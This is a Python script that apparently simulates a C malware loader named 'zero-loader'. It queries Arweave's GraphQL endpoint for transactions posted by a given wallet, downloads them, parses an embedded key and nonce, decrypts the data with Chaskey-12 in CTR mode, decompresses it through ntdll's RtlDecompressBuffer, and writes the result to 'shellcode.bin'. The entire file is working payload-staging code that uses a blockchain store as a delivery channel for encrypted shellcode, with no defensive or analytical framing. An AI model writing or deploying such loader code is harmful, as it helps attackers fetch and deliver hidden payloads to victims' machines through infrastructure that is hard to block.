"""
download.py — Simulate the C loader's full Arweave fetch pipeline.

Mirrors Arweave.c + Crypt.c exactly:
  1. POST arweave.net/graphql  (owners + App-Name=zero-loader + block:{min:1})
  2. Extract TX IDs from JSON response (same 43-char base64url search as C)
  3. GET arweave.net/<txid>
  4. ArwParseHeader — locate 4 pipes, decode hex key/nonce, read size + compressed flag
  5. ChaskeyCtrDecrypt — Chaskey-12 ARX, CTR mode, little-endian u32
  6. RtlDecompressBuffer LZNT1 via ctypes ntdll  (if compressed flag == 1)

Usage:
    python download.py <wallet_address> [--save <output.bin>]

    --save   Write decrypted shellcode to file (default: shellcode.bin)

Requirements:
    Windows only (step 6 uses ntdll). No pip packages needed.
"""

import ctypes
import json
import re
import struct
import sys
import time
import urllib.request

ARWEAVE_HOST  = "arweave.net"
GRAPHQL_URL   = f"https://{ARWEAVE_HOST}/graphql"
USER_AGENT    = "Mozilla/5.0"
TIMEOUT_S     = 30
NET_RETRY     = 3
RETRY_DELAY_S = 10

COMPRESSION_FORMAT_LZNT1 = 0x0002


# ── Step 1: build + send GraphQL POST ─────────────────────────────────────────

def graphql_query(wallet: str) -> list[str]:
    q = (
        f'{{ transactions(owners: ["{wallet}"],'
        f' first: 10, sort: HEIGHT_DESC,'
        f' tags: [{{ name: "App-Name", values: ["zero-loader"] }}],'
        f' block: {{ min: 1 }}) {{ edges {{ node {{ id }} }} }} }}'
    )
    body = json.dumps({"query": q}).encode()
    req  = urllib.request.Request(
        GRAPHQL_URL, data=body,
        headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
        method="POST",
    )
    print(f"[>] POST {GRAPHQL_URL}", flush=True)
    with urllib.request.urlopen(req, timeout=TIMEOUT_S) as r:
        resp = r.read()
    print(f"    {resp.decode(errors='replace')[:200]}", flush=True)
    ids = re.findall(rb'"id":"([A-Za-z0-9_\-]{43})"', resp)
    ids = [i.decode() for i in ids]
    print(f"[*] {len(ids)} TX ID(s): {ids}", flush=True)
    return ids


# ── Step 2: download TX data ───────────────────────────────────────────────────

def fetch_tx(tx_id: str) -> bytes:
    url = f"https://{ARWEAVE_HOST}/{tx_id}"
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    print(f"[>] GET {url}", flush=True)
    with urllib.request.urlopen(req, timeout=TIMEOUT_S) as r:
        data = r.read()
    print(f"    {len(data):,} bytes received", flush=True)
    return data


# ── Step 3: ArwParseHeader (mirrors Arweave.c exactly) ────────────────────────

def parse_header(buf: bytes):
    """
    Format: <32-hex-key>|<24-hex-nonce>|<decimal-size>|<0|1>|<binary>
    Returns (key, nonce, orig_size, compressed, data_offset) or raises ValueError.
    """
    scan = buf[:128]
    pipes = [i for i, b in enumerate(scan) if b == ord('|')][:4]
    if len(pipes) < 4:
        raise ValueError(f"Only {len(pipes)} pipe(s) found in header")

    p0, p1, p2, p3 = pipes

    if p0 != 32:
        raise ValueError(f"Key field length {p0} != 32")
    key = bytes.fromhex(scan[:32].decode())

    if p1 - (p0 + 1) != 24:
        raise ValueError(f"Nonce field length {p1 - p0 - 1} != 24")
    nonce = bytes.fromhex(scan[p0 + 1:p1].decode())

    size_field = scan[p1 + 1:p2].decode()
    if not size_field.isdigit() or len(size_field) == 0:
        raise ValueError(f"Invalid size field: {size_field!r}")
    orig_size = int(size_field)
    if orig_size == 0:
        raise ValueError("orig_size == 0")

    if p3 - (p2 + 1) != 1:
        raise ValueError("Compressed flag field length != 1")
    compressed = (scan[p2 + 1] == ord('1'))

    data_off = p3 + 1
    if data_off >= len(buf):
        raise ValueError("data_off past end of buffer")

    return key, nonce, orig_size, compressed, data_off


# ── Step 4: ChaskeyCtrDecrypt (mirrors Crypt.c exactly) ───────────────────────

def _rotl32(x, n):
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF


def _chaskey12(v):
    v = list(v)
    for _ in range(12):
        v[0] = (v[0] + v[1]) & 0xFFFFFFFF; v[1] = _rotl32(v[1], 5);  v[1] ^= v[0]; v[0] = _rotl32(v[0], 16)
        v[2] = (v[2] + v[3]) & 0xFFFFFFFF; v[3] = _rotl32(v[3], 8);  v[3] ^= v[2]
        v[0] = (v[0] + v[3]) & 0xFFFFFFFF; v[3] = _rotl32(v[3], 13); v[3] ^= v[0]
        v[2] = (v[2] + v[1]) & 0xFFFFFFFF; v[1] = _rotl32(v[1], 7);  v[1] ^= v[2]; v[2] = _rotl32(v[2], 16)
    return v


def chaskey_ctr_decrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
    k = list(struct.unpack_from("<4I", key))
    n = list(struct.unpack_from("<3I", nonce))
    out = bytearray(data)
    for blk in range((len(data) + 15) // 16):
        ctr = _chaskey12([n[0] ^ k[0], n[1] ^ k[1], n[2] ^ k[2], blk ^ k[3]])
        ctr = [ctr[i] ^ k[i] for i in range(4)]
        ks  = struct.pack("<4I", *ctr)
        off = blk * 16
        for i in range(min(16, len(data) - off)):
            out[off + i] ^= ks[i]
    return bytes(out)


# ── Step 5: LZNT1 decompress via ntdll!RtlDecompressBuffer ────────────────────

def lznt1_decompress(compressed: bytes, orig_size: int) -> bytes:
    ntdll    = ctypes.WinDLL("ntdll")
    out_buf  = ctypes.create_string_buffer(orig_size)
    in_buf   = ctypes.create_string_buffer(compressed, len(compressed))
    final_sz = ctypes.c_ulong(0)
    status   = ntdll.RtlDecompressBuffer(
        COMPRESSION_FORMAT_LZNT1,
        out_buf, orig_size,
        in_buf,  len(compressed),
        ctypes.byref(final_sz),
    )
    if status != 0:
        raise RuntimeError(f"RtlDecompressBuffer NTSTATUS=0x{status & 0xFFFFFFFF:08X}")
    if final_sz.value != orig_size:
        raise RuntimeError(f"Size mismatch: got {final_sz.value}, expected {orig_size}")
    return out_buf.raw[:final_sz.value]


# ── main pipeline ──────────────────────────────────────────────────────────────

def run(wallet: str, save_path: str = "shellcode.bin"):
    print("=" * 60)
    print(f"Wallet: {wallet}")
    print("=" * 60)

    for attempt in range(1, NET_RETRY + 2):
        print(f"\n--- Attempt {attempt} ---")
        try:
            tx_ids = graphql_query(wallet)
        except Exception as e:
            print(f"[!] GraphQL error: {e}")
            if attempt <= NET_RETRY:
                time.sleep(RETRY_DELAY_S)
            continue

        if not tx_ids:
            print("[!] No TX IDs found.")
            if attempt <= NET_RETRY:
                time.sleep(RETRY_DELAY_S)
            continue

        found = False
        for tx_id in tx_ids[:10]:
            print(f"\n[TX] {tx_id}")

            try:
                raw = fetch_tx(tx_id)
            except Exception as e:
                print(f"  [!] Download failed: {e}")
                continue

            if len(raw) < 60:
                print(f"  [!] Too short ({len(raw)} bytes)")
                continue

            try:
                key, nonce, orig_size, compressed, data_off = parse_header(raw)
            except ValueError as e:
                print(f"  [!] Header parse failed: {e}")
                print(f"      First 120 bytes: {raw[:120]!r}")
                continue

            payload = raw[data_off:]
            print(f"  [+] Header OK — key={key.hex()} nonce={nonce.hex()}")
            print(f"      orig_size={orig_size} compressed={compressed} payload={len(payload)} bytes")

            print(f"  [*] Decrypting (Chaskey-12 CTR) …", flush=True)
            decrypted = chaskey_ctr_decrypt(payload, key, nonce)
            print(f"  [+] Decrypted {len(decrypted):,} bytes", flush=True)

            if compressed:
                print(f"  [*] Decompressing LZNT1 → {orig_size:,} bytes …", flush=True)
                try:
                    shellcode = lznt1_decompress(decrypted, orig_size)
                except Exception as e:
                    print(f"  [!] Decompress failed: {e}")
                    continue
                print(f"  [+] Decompressed {len(shellcode):,} bytes")
            else:
                shellcode = decrypted

            size_ok = len(shellcode) == orig_size
            print(f"\n  [+] SUCCESS")
            print(f"      Size : {len(shellcode):,} bytes {'✓' if size_ok else '!= ' + str(orig_size)}")
            print(f"      First: {shellcode[:16].hex()}")
            print(f"      Last : {shellcode[-16:].hex()}")

            with open(save_path, "wb") as f:
                f.write(shellcode)
            print(f"      Saved: {save_path}")

            found = True
            break

        if found:
            break

        print("[!] No valid payload found.")
        if attempt <= NET_RETRY:
            print(f"    Retrying in {RETRY_DELAY_S}s …")
            time.sleep(RETRY_DELAY_S)
    else:
        print("\n[!] All retries exhausted.")
        sys.exit(1)


if __name__ == "__main__":
    args = sys.argv[1:]
    if not args:
        print("Usage: python download.py <wallet_address> [--save <output.bin>]")
        sys.exit(1)

    wallet = args[0]
    save   = "shellcode.bin"
    if "--save" in args:
        idx  = args.index("--save")
        save = args[idx + 1] if idx + 1 < len(args) else save

    run(wallet, save)
